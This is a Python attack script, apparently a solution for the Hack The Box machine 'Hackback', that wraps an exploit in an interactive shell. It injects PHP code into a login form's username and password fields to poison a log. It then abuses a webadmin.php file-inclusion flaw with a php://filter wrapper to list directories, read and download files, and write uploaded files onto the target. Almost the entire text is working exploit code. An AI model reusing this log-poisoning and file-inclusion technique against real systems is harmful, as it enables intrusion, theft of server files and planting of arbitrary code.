#!/usr/bin/env python3

import hashlib
import netifaces
import re
import requests
from cmd import Cmd
from base64 import b64decode, b64encode


class Terminal(Cmd):
    prompt = "hackback> "
  
    def __init__(self, proxy=None):
        super().__init__()
        self.my_ip = netifaces.ifaddresses('tun0')[netifaces.AF_INET][0]['addr']
        self.sess = hashlib.sha256(self.my_ip.encode()).hexdigest()
        self.webadmin_url =  f'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?' 
        self.webadmin_url += f'action={{action}}&site=hackthebox&password=12345678&session={self.sess}&'
        self.webadmin_url += f'dir={{dir}}&file=php://filter/convert.base64-encode/resource={{file}}'
        self.post_url = 'http://www.hackthebox.htb'
        self.proxy = proxy or {} 
        self.cookie = {'PHPSESSID': self.sess}
        self.clean_log()

    def clean_log(self):
        requests.get(self.webadmin_url.format(action='init', dir='', file=''), 
                     cookies=self.cookie, proxies=self.proxy, allow_redirects=False)
        requests.post(self.post_url, cookies=self.cookie, proxies=self.proxy,
                     data={'username': "qqqqqq<?php echo print_r(scandir($_GET['dir'])); ?>zzzzzz",
                           'password': "xxxxxx<?php include($_GET['file']); ?>pppppp",
                           'submit': ""})

    def do_dir(self, args):
        '''Do a directory listening of the given path
        Spaces in file path allowed'''
        args = args or '.'
        resp = requests.get(self.webadmin_url.format(action='show', dir=args, file=''),
                            cookies=self.cookie, proxies=self.proxy, allow_redirects=False)
        print(re.search("qqqqqq(.*)zzzzzz", resp.text, re.DOTALL).group(1))

    def do_type(self, args):
        '''Print the contents of a file
        Spaces in file path allowed'''
        resp = requests.get(self.webadmin_url.format(action='show', dir='', file=args), 
                            cookies=self.cookie, proxies=self.proxy, allow_redirects=False)
        print(b64decode(re.search("xxxxxx(.*)pppppp", resp.text, re.DOTALL).group(1)).decode())

    def do_save(self, args):
        '''Save the contents of a file to a file
        Spaces in file path allowed
        save [relative path on hackback] [path to save to]'''
        args = args.split(' ')
        out_file = args[-1] 
        file_path = ' '.join(args[:-1]) or out_file
        resp = requests.get(self.webadmin_url.format(action='show', dir='', file=file_path),
                            cookies=self.cookie, proxies=self.proxy, allow_redirects=False)
        with open(out_file, 'wb') as f:
             f.write(b64decode(re.search("xxxxxx(.*)pppppp", resp.text, re.DOTALL).group(1)))

    def do_upload(self, args):
        '''Upload a local file to target
        Spaces allowed in target path, not local path
        upload [local file] [path on target]'''
        args = args.split(' ')
        to_upload = args[0]
        file_path = ' '.join(args[1:])
        with open(to_upload, 'rb') as f:
            b64 = b64encode(f.read()).decode()
        requests.post(self.post_url, cookies=self.cookie, proxies=self.proxy,
                     data={'username': f'<?php $f = "{b64}"; file_put_contents("{file_path}", base64_decode($f)); ?>',
                           'password': "xxxxxx",
                           'submit': ""})
        requests.get(self.webadmin_url.format(action='show', dir='', file=''),
                     cookies=self.cookie, proxies=self.proxy, allow_redirects=False)
        self.clean_log()


term = Terminal(proxy={'http': 'http://127.0.0.1:8080'})
try:
    term.cmdloop()
except KeyboardInterrupt:
    pass
